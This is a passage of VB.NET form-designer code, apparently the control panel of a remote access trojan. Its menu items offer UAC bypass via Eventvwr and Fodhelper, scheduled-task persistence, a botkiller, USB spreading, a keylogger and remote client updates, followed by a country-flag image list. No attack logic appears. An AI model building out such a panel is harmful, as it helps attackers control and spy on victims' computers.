        Me.LockToolStripMenuItem.Name = "LockToolStripMenuItem"
        Me.LockToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.LockToolStripMenuItem.Text = "Lock"
        '
        'LockToolStripMenuItem1
        '
        Me.LockToolStripMenuItem1.BackColor = System.Drawing.Color.Black
        Me.LockToolStripMenuItem1.ForeColor = System.Drawing.Color.White
        Me.LockToolStripMenuItem1.Image = CType(resources.GetObject("LockToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.LockToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.LockToolStripMenuItem1.Name = "LockToolStripMenuItem1"
        Me.LockToolStripMenuItem1.Size = New System.Drawing.Size(111, 22)
        Me.LockToolStripMenuItem1.Text = "Lock"
        '
        'UnlockToolStripMenuItem
        '
        Me.UnlockToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.UnlockToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.UnlockToolStripMenuItem.Image = CType(resources.GetObject("UnlockToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UnlockToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.UnlockToolStripMenuItem.Name = "UnlockToolStripMenuItem"
        Me.UnlockToolStripMenuItem.Size = New System.Drawing.Size(111, 22)
        Me.UnlockToolStripMenuItem.Text = "Unlock"
        '
        'UACToolStripMenuItem
        '
        Me.UACToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.UACToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.EventvwrToolStripMenuItem, Me.RunAsToolStripMenuItem, Me.FodhelperToolStripMenuItem})
        Me.UACToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.UACToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.UACToolStripMenuItem.Image = CType(resources.GetObject("UACToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UACToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.UACToolStripMenuItem.Name = "UACToolStripMenuItem"
        Me.UACToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.UACToolStripMenuItem.Text = "Admin Privileges"
        '
        'EventvwrToolStripMenuItem
        '
        Me.EventvwrToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.EventvwrToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.EventvwrToolStripMenuItem.Image = CType(resources.GetObject("EventvwrToolStripMenuItem.Image"), System.Drawing.Image)
        Me.EventvwrToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.EventvwrToolStripMenuItem.Name = "EventvwrToolStripMenuItem"
        Me.EventvwrToolStripMenuItem.Size = New System.Drawing.Size(182, 22)
        Me.EventvwrToolStripMenuItem.Text = "Eventvwr (Win7)"
        '
        'RunAsToolStripMenuItem
        '
        Me.RunAsToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.RunAsToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.RunAsToolStripMenuItem.Image = CType(resources.GetObject("RunAsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RunAsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RunAsToolStripMenuItem.Name = "RunAsToolStripMenuItem"
        Me.RunAsToolStripMenuItem.Size = New System.Drawing.Size(182, 22)
        Me.RunAsToolStripMenuItem.Text = "RunAs (Not Bypass)"
        '
        'FodhelperToolStripMenuItem
        '
        Me.FodhelperToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.FodhelperToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.FodhelperToolStripMenuItem.Image = CType(resources.GetObject("FodhelperToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FodhelperToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.FodhelperToolStripMenuItem.Name = "FodhelperToolStripMenuItem"
        Me.FodhelperToolStripMenuItem.Size = New System.Drawing.Size(182, 22)
        Me.FodhelperToolStripMenuItem.Text = "Check if Admin"
        '
        'ScheduledTasksToolStripMenuItem
        '
        Me.ScheduledTasksToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ScheduledTasksToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ScheduleTasksToolStripMenuItem, Me.RemoteScheduledTasksToolStripMenuItem, Me.ToolStripMenuItem2, Me.ToolStripMenuItem3})
        Me.ScheduledTasksToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ScheduledTasksToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ScheduledTasksToolStripMenuItem.Image = CType(resources.GetObject("ScheduledTasksToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ScheduledTasksToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ScheduledTasksToolStripMenuItem.Name = "ScheduledTasksToolStripMenuItem"
        Me.ScheduledTasksToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.ScheduledTasksToolStripMenuItem.Text = "Persistence"
        '
        'ScheduleTasksToolStripMenuItem
        '
        Me.ScheduleTasksToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ScheduleTasksToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ScheduleTasksToolStripMenuItem.Image = CType(resources.GetObject("ScheduleTasksToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ScheduleTasksToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ScheduleTasksToolStripMenuItem.Name = "ScheduleTasksToolStripMenuItem"
        Me.ScheduleTasksToolStripMenuItem.Size = New System.Drawing.Size(216, 22)
        Me.ScheduleTasksToolStripMenuItem.Text = "Add Scheduled Tasks"
        '
        'RemoteScheduledTasksToolStripMenuItem
        '
        Me.RemoteScheduledTasksToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.RemoteScheduledTasksToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.RemoteScheduledTasksToolStripMenuItem.Image = CType(resources.GetObject("RemoteScheduledTasksToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteScheduledTasksToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RemoteScheduledTasksToolStripMenuItem.Name = "RemoteScheduledTasksToolStripMenuItem"
        Me.RemoteScheduledTasksToolStripMenuItem.Size = New System.Drawing.Size(216, 22)
        Me.RemoteScheduledTasksToolStripMenuItem.Text = "Remove Scheduled Tasks"
        '
        'ToolStripMenuItem2
        '
        Me.ToolStripMenuItem2.BackColor = System.Drawing.Color.Black
        Me.ToolStripMenuItem2.ForeColor = System.Drawing.Color.White
        Me.ToolStripMenuItem2.Image = CType(resources.GetObject("ToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem2.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripMenuItem2.Name = "ToolStripMenuItem2"
        Me.ToolStripMenuItem2.Size = New System.Drawing.Size(216, 22)
        Me.ToolStripMenuItem2.Text = "Malware Killer / Botkiller"
        '
        'ToolStripMenuItem3
        '
        Me.ToolStripMenuItem3.BackColor = System.Drawing.Color.Black
        Me.ToolStripMenuItem3.ForeColor = System.Drawing.Color.White
        Me.ToolStripMenuItem3.Image = CType(resources.GetObject("ToolStripMenuItem3.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem3.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripMenuItem3.Name = "ToolStripMenuItem3"
        Me.ToolStripMenuItem3.Size = New System.Drawing.Size(216, 22)
        Me.ToolStripMenuItem3.Text = "Spread to USB Drives"
        '
        'KeyloggerToolStripMenuItem
        '
        Me.KeyloggerToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.KeyloggerToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.KeyloggerToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.KeyloggerToolStripMenuItem.Image = CType(resources.GetObject("KeyloggerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.KeyloggerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.KeyloggerToolStripMenuItem.Name = "KeyloggerToolStripMenuItem"
        Me.KeyloggerToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.KeyloggerToolStripMenuItem.Text = "Keylogger"
        '
        'OpenChatToolStripMenuItem
        '
        Me.OpenChatToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.OpenChatToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.OpenChatToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.OpenChatToolStripMenuItem.Image = CType(resources.GetObject("OpenChatToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OpenChatToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.OpenChatToolStripMenuItem.Name = "OpenChatToolStripMenuItem"
        Me.OpenChatToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.OpenChatToolStripMenuItem.Text = "Open Chat"
        '
        'PCToolStripMenuItem
        '
        Me.PCToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.PCToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ShutdownToolStripMenuItem, Me.RestartToolStripMenuItem2, Me.LogoffToolStripMenuItem})
        Me.PCToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold)
        Me.PCToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.PCToolStripMenuItem.Image = CType(resources.GetObject("PCToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PCToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.PCToolStripMenuItem.Name = "PCToolStripMenuItem"
        Me.PCToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.PCToolStripMenuItem.Text = "Power Options"
        '
        'ShutdownToolStripMenuItem
        '
        Me.ShutdownToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ShutdownToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ShutdownToolStripMenuItem.Image = CType(resources.GetObject("ShutdownToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ShutdownToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem"
        Me.ShutdownToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.ShutdownToolStripMenuItem.Text = "Shutdown"
        '
        'RestartToolStripMenuItem2
        '
        Me.RestartToolStripMenuItem2.BackColor = System.Drawing.Color.Black
        Me.RestartToolStripMenuItem2.ForeColor = System.Drawing.Color.White
        Me.RestartToolStripMenuItem2.Image = CType(resources.GetObject("RestartToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.RestartToolStripMenuItem2.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RestartToolStripMenuItem2.Name = "RestartToolStripMenuItem2"
        Me.RestartToolStripMenuItem2.Size = New System.Drawing.Size(130, 22)
        Me.RestartToolStripMenuItem2.Text = "Restart"
        '
        'LogoffToolStripMenuItem
        '
        Me.LogoffToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.LogoffToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.LogoffToolStripMenuItem.Image = CType(resources.GetObject("LogoffToolStripMenuItem.Image"), System.Drawing.Image)
        Me.LogoffToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.LogoffToolStripMenuItem.Name = "LogoffToolStripMenuItem"
        Me.LogoffToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.LogoffToolStripMenuItem.Text = "Logoff"
        '
        'ServerToolStripMenuItem
        '
        Me.ServerToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ServerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.UninstallToolStripMenuItem, Me.RestartToolStripMenuItem, Me.CloseToolStripMenuItem, Me.DisconnectToolStripMenuItem, Me.RenameToolStripMenuItem})
        Me.ServerToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ServerToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ServerToolStripMenuItem.Image = CType(resources.GetObject("ServerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ServerToolStripMenuItem.Name = "ServerToolStripMenuItem"
        Me.ServerToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.ServerToolStripMenuItem.Text = "Client"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.UpdateToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDISKToolStripMenuItem1, Me.FromLINKToolStripMenuItem1})
        Me.UpdateToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.UpdateToolStripMenuItem.Image = CType(resources.GetObject("UpdateToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UpdateToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'FromDISKToolStripMenuItem1
        '
        Me.FromDISKToolStripMenuItem1.BackColor = System.Drawing.Color.Black
        Me.FromDISKToolStripMenuItem1.ForeColor = System.Drawing.Color.White
        Me.FromDISKToolStripMenuItem1.Image = CType(resources.GetObject("FromDISKToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FromDISKToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.FromDISKToolStripMenuItem1.Name = "FromDISKToolStripMenuItem1"
        Me.FromDISKToolStripMenuItem1.Size = New System.Drawing.Size(130, 22)
        Me.FromDISKToolStripMenuItem1.Text = "From Disk"
        '
        'FromLINKToolStripMenuItem1
        '
        Me.FromLINKToolStripMenuItem1.BackColor = System.Drawing.Color.Black
        Me.FromLINKToolStripMenuItem1.ForeColor = System.Drawing.Color.White
        Me.FromLINKToolStripMenuItem1.Image = CType(resources.GetObject("FromLINKToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FromLINKToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.FromLINKToolStripMenuItem1.Name = "FromLINKToolStripMenuItem1"
        Me.FromLINKToolStripMenuItem1.Size = New System.Drawing.Size(130, 22)
        Me.FromLINKToolStripMenuItem1.Text = "From Link"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.UninstallToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.UninstallToolStripMenuItem.Image = CType(resources.GetObject("UninstallToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UninstallToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.RestartToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.RestartToolStripMenuItem.Image = CType(resources.GetObject("RestartToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RestartToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.CloseToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.CloseToolStripMenuItem.Image = CType(resources.GetObject("CloseToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CloseToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'DisconnectToolStripMenuItem
        '
        Me.DisconnectToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.DisconnectToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.DisconnectToolStripMenuItem.Image = CType(resources.GetObject("DisconnectToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DisconnectToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.DisconnectToolStripMenuItem.Name = "DisconnectToolStripMenuItem"
        Me.DisconnectToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.DisconnectToolStripMenuItem.Text = "Disconnect"
        '
        'RenameToolStripMenuItem
        '
        Me.RenameToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.RenameToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.RenameToolStripMenuItem.Image = CType(resources.GetObject("RenameToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RenameToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem"
        Me.RenameToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.RenameToolStripMenuItem.Text = "Rename"
        '
        'OpenFolderToolStripMenuItem
        '
        Me.OpenFolderToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.OpenFolderToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.OpenFolderToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.OpenFolderToolStripMenuItem.Image = CType(resources.GetObject("OpenFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OpenFolderToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.OpenFolderToolStripMenuItem.Name = "OpenFolderToolStripMenuItem"
        Me.OpenFolderToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.OpenFolderToolStripMenuItem.Text = "Open Folder"
        '
        'IMG2
        '
        Me.IMG2.ImageStream = CType(resources.GetObject("IMG2.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.IMG2.TransparentColor = System.Drawing.Color.Transparent
        Me.IMG2.Images.SetKeyName(0, "--.png")
        Me.IMG2.Images.SetKeyName(1, "AD.png")
        Me.IMG2.Images.SetKeyName(2, "AE.png")
        Me.IMG2.Images.SetKeyName(3, "AF.png")
        Me.IMG2.Images.SetKeyName(4, "AG.png")
        Me.IMG2.Images.SetKeyName(5, "AI.png")
        Me.IMG2.Images.SetKeyName(6, "AL.png")
        Me.IMG2.Images.SetKeyName(7, "AM.png")
        Me.IMG2.Images.SetKeyName(8, "AN.png")
        Me.IMG2.Images.SetKeyName(9, "AO.png")
        Me.IMG2.Images.SetKeyName(10, "AQ.png")
        Me.IMG2.Images.SetKeyName(11, "AR.png")
        Me.IMG2.Images.SetKeyName(12, "AS.png")
        Me.IMG2.Images.SetKeyName(13, "AT.png")
        Me.IMG2.Images.SetKeyName(14, "AU.png")
        Me.IMG2.Images.SetKeyName(15, "AW.png")
        Me.IMG2.Images.SetKeyName(16, "AX.png")
        Me.IMG2.Images.SetKeyName(17, "AZ.png")
        Me.IMG2.Images.SetKeyName(18, "BA.png")
        Me.IMG2.Images.SetKeyName(19, "BB.png")
        Me.IMG2.Images.SetKeyName(20, "BD.png")
        Me.IMG2.Images.SetKeyName(21, "BE.png")
        Me.IMG2.Images.SetKeyName(22, "BF.png")
        Me.IMG2.Images.SetKeyName(23, "BG.png")
        Me.IMG2.Images.SetKeyName(24, "BH.png")
        Me.IMG2.Images.SetKeyName(25, "BI.png")
        Me.IMG2.Images.SetKeyName(26, "BJ.png")
        Me.IMG2.Images.SetKeyName(27, "BL.png")
        Me.IMG2.Images.SetKeyName(28, "BM.png")
        Me.IMG2.Images.SetKeyName(29, "BN.png")
        Me.IMG2.Images.SetKeyName(30, "BO.png")
        Me.IMG2.Images.SetKeyName(31, "BR.png")
        Me.IMG2.Images.SetKeyName(32, "BS.png")
        Me.IMG2.Images.SetKeyName(33, "BT.png")
        Me.IMG2.Images.SetKeyName(34, "BW.png")
        Me.IMG2.Images.SetKeyName(35, "BY.png")
        Me.IMG2.Images.SetKeyName(36, "BZ.png")
        Me.IMG2.Images.SetKeyName(37, "CA.png")
        Me.IMG2.Images.SetKeyName(38, "CC.png")
        Me.IMG2.Images.SetKeyName(39, "CD.png")
        Me.IMG2.Images.SetKeyName(40, "CF.png")
        Me.IMG2.Images.SetKeyName(41, "CG.png")
        Me.IMG2.Images.SetKeyName(42, "CH.png")
        Me.IMG2.Images.SetKeyName(43, "CI.png")
        Me.IMG2.Images.SetKeyName(44, "CK.png")
        Me.IMG2.Images.SetKeyName(45, "CL.png")
        Me.IMG2.Images.SetKeyName(46, "CM.png")
        Me.IMG2.Images.SetKeyName(47, "CN.png")
        Me.IMG2.Images.SetKeyName(48, "CO.png")
        Me.IMG2.Images.SetKeyName(49, "CR.png")
        Me.IMG2.Images.SetKeyName(50, "CU.png")
        Me.IMG2.Images.SetKeyName(51, "CV.png")
        Me.IMG2.Images.SetKeyName(52, "CW.png")
        Me.IMG2.Images.SetKeyName(53, "CX.png")
        Me.IMG2.Images.SetKeyName(54, "CY.png")
        Me.IMG2.Images.SetKeyName(55, "CZ.png")
        Me.IMG2.Images.SetKeyName(56, "DE.png")
        Me.IMG2.Images.SetKeyName(57, "DJ.png")
        Me.IMG2.Images.SetKeyName(58, "DK.png")
        Me.IMG2.Images.SetKeyName(59, "DM.png")
        Me.IMG2.Images.SetKeyName(60, "DO.png")
        Me.IMG2.Images.SetKeyName(61, "DZ.png")
        Me.IMG2.Images.SetKeyName(62, "EC.png")
        Me.IMG2.Images.SetKeyName(63, "EE.png")
        Me.IMG2.Images.SetKeyName(64, "EG.png")
        Me.IMG2.Images.SetKeyName(65, "EH.png")
        Me.IMG2.Images.SetKeyName(66, "ER.png")
        Me.IMG2.Images.SetKeyName(67, "ES.png")
        Me.IMG2.Images.SetKeyName(68, "ET.png")
        Me.IMG2.Images.SetKeyName(69, "EU.png")
        Me.IMG2.Images.SetKeyName(70, "FI.png")
        Me.IMG2.Images.SetKeyName(71, "FJ.png")
        Me.IMG2.Images.SetKeyName(72, "FK.png")
        Me.IMG2.Images.SetKeyName(73, "FM.png")
        Me.IMG2.Images.SetKeyName(74, "FO.png")
        Me.IMG2.Images.SetKeyName(75, "FR.png")
        Me.IMG2.Images.SetKeyName(76, "GA.png")
        Me.IMG2.Images.SetKeyName(77, "GB.png")
        Me.IMG2.Images.SetKeyName(78, "GD.png")
        Me.IMG2.Images.SetKeyName(79, "GE.png")
        Me.IMG2.Images.SetKeyName(80, "GG.png")
        Me.IMG2.Images.SetKeyName(81, "GH.png")
        Me.IMG2.Images.SetKeyName(82, "GI.png")
        Me.IMG2.Images.SetKeyName(83, "GL.png")
        Me.IMG2.Images.SetKeyName(84, "GM.png")
        Me.IMG2.Images.SetKeyName(85, "GN.png")
        Me.IMG2.Images.SetKeyName(86, "GQ.png")
        Me.IMG2.Images.SetKeyName(87, "GR.png")
        Me.IMG2.Images.SetKeyName(88, "GS.png")
        Me.IMG2.Images.SetKeyName(89, "GT.png")
        Me.IMG2.Images.SetKeyName(90, "GU.png")
        Me.IMG2.Images.SetKeyName(91, "GW.png")
        Me.IMG2.Images.SetKeyName(92, "GY.png")
        Me.IMG2.Images.SetKeyName(93, "HK.png")
        Me.IMG2.Images.SetKeyName(94, "HN.png")
        Me.IMG2.Images.SetKeyName(95, "HR.png")
        Me.IMG2.Images.SetKeyName(96, "HT.png")
        Me.IMG2.Images.SetKeyName(97, "HU.png")
        Me.IMG2.Images.SetKeyName(98, "IC.png")
        Me.IMG2.Images.SetKeyName(99, "ID.png")
        Me.IMG2.Images.SetKeyName(100, "IE.png")
        Me.IMG2.Images.SetKeyName(101, "IL.png")
        Me.IMG2.Images.SetKeyName(102, "IM.png")
        Me.IMG2.Images.SetKeyName(103, "IN.png")
        Me.IMG2.Images.SetKeyName(104, "IQ.png")
        Me.IMG2.Images.SetKeyName(105, "IR.png")
        Me.IMG2.Images.SetKeyName(106, "IS.png")
        Me.IMG2.Images.SetKeyName(107, "IT.png")
        Me.IMG2.Images.SetKeyName(108, "JE.png")
        Me.IMG2.Images.SetKeyName(109, "JM.png")
        Me.IMG2.Images.SetKeyName(110, "JO.png")
        Me.IMG2.Images.SetKeyName(111, "JP.png")
        Me.IMG2.Images.SetKeyName(112, "KE.png")
        Me.IMG2.Images.SetKeyName(113, "KG.png")
        Me.IMG2.Images.SetKeyName(114, "KH.png")
        Me.IMG2.Images.SetKeyName(115, "KI.png")
        Me.IMG2.Images.SetKeyName(116, "KM.png")
        Me.IMG2.Images.SetKeyName(117, "KN.png")
        Me.IMG2.Images.SetKeyName(118, "KP.png")
        Me.IMG2.Images.SetKeyName(119, "KR.png")
        Me.IMG2.Images.SetKeyName(120, "KW.png")
        Me.IMG2.Images.SetKeyName(121, "KY.png")
        Me.IMG2.Images.SetKeyName(122, "KZ.png")
        Me.IMG2.Images.SetKeyName(123, "LA.png")
        Me.IMG2.Images.SetKeyName(124, "LB.png")
        Me.IMG2.Images.SetKeyName(125, "LC.png")
        Me.IMG2.Images.SetKeyName(126, "LI.png")
        Me.IMG2.Images.SetKeyName(127, "LK.png")
        Me.IMG2.Images.SetKeyName(128, "LR.png")
        Me.IMG2.Images.SetKeyName(129, "LS.png")
        Me.IMG2.Images.SetKeyName(130, "LT.png")
        Me.IMG2.Images.SetKeyName(131, "LU.png")
        Me.IMG2.Images.SetKeyName(132, "LV.png")
        Me.IMG2.Images.SetKeyName(133, "LY.png")
        Me.IMG2.Images.SetKeyName(134, "MA.png")
        Me.IMG2.Images.SetKeyName(135, "MC.png")
        Me.IMG2.Images.SetKeyName(136, "MD.png")
        Me.IMG2.Images.SetKeyName(137, "ME.png")
        Me.IMG2.Images.SetKeyName(138, "MF.png")
        Me.IMG2.Images.SetKeyName(139, "MG.png")
        Me.IMG2.Images.SetKeyName(140, "MH.png")
        Me.IMG2.Images.SetKeyName(141, "MK.png")
        Me.IMG2.Images.SetKeyName(142, "ML.png")
        Me.IMG2.Images.SetKeyName(143, "MM.png")
        Me.IMG2.Images.SetKeyName(144, "MN.png")
        Me.IMG2.Images.SetKeyName(145, "MO.png")
        Me.IMG2.Images.SetKeyName(146, "MP.png")
        Me.IMG2.Images.SetKeyName(147, "MQ.png")
        Me.IMG2.Images.SetKeyName(148, "MR.png")
        Me.IMG2.Images.SetKeyName(149, "MS.png")
        Me.IMG2.Images.SetKeyName(150, "MT.png")
        Me.IMG2.Images.SetKeyName(151, "MU.png")
        Me.IMG2.Images.SetKeyName(152, "MV.png")
        Me.IMG2.Images.SetKeyName(153, "MW.png")
        Me.IMG2.Images.SetKeyName(154, "MX.png")
        Me.IMG2.Images.SetKeyName(155, "MY.png")
        Me.IMG2.Images.SetKeyName(156, "MZ.png")
        Me.IMG2.Images.SetKeyName(157, "NA.png")
        Me.IMG2.Images.SetKeyName(158, "NC.png")
        Me.IMG2.Images.SetKeyName(159, "NE.png")
        Me.IMG2.Images.SetKeyName(160, "NF.png")
        Me.IMG2.Images.SetKeyName(161, "NG.png")
        Me.IMG2.Images.SetKeyName(162, "NI.png")
        Me.IMG2.Images.SetKeyName(163, "NL.png")
        Me.IMG2.Images.SetKeyName(164, "NO.png")
        Me.IMG2.Images.SetKeyName(165, "NP.png")
        Me.IMG2.Images.SetKeyName(166, "NR.png")
        Me.IMG2.Images.SetKeyName(167, "NU.png")
        Me.IMG2.Images.SetKeyName(168, "NZ.png")
        Me.IMG2.Images.SetKeyName(169, "OM.png")
        Me.IMG2.Images.SetKeyName(170, "PA.png")
        Me.IMG2.Images.SetKeyName(171, "PE.png")
        Me.IMG2.Images.SetKeyName(172, "PF.png")
        Me.IMG2.Images.SetKeyName(173, "PG.png")
        Me.IMG2.Images.SetKeyName(174, "PH.png")
        Me.IMG2.Images.SetKeyName(175, "PK.png")
        Me.IMG2.Images.SetKeyName(176, "PL.png")
        Me.IMG2.Images.SetKeyName(177, "PN.png")
        Me.IMG2.Images.SetKeyName(178, "PR.png")
        Me.IMG2.Images.SetKeyName(179, "PS.png")
        Me.IMG2.Images.SetKeyName(180, "PT.png")
        Me.IMG2.Images.SetKeyName(181, "PW.png")
